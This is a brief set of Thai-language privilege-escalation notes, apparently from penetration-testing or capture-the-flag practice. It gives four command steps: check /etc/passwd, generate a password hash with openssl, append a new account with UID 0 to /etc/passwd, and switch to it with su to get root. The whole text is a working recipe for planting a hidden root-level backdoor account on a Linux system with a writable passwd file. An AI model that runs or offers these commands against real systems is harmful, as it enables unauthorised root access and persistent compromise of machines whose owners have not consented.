#privesc 
# Step
1. ดู user หากแก้ไข passwd ได้แปลว่าใช้วิธีนี้ได้
```bash
cat /etc/passwd
```
2. สร้าง password และ save hash เอาไว้
```bash
openssl passwd -1
```
3.ตั้งค่า root
```bash
echo 'drasogun:hash:0:0:drasogun:/home/drasogun:/bin/bash' >> /etc/passwd
```
4. เข้า root
```bash
su drasogun
```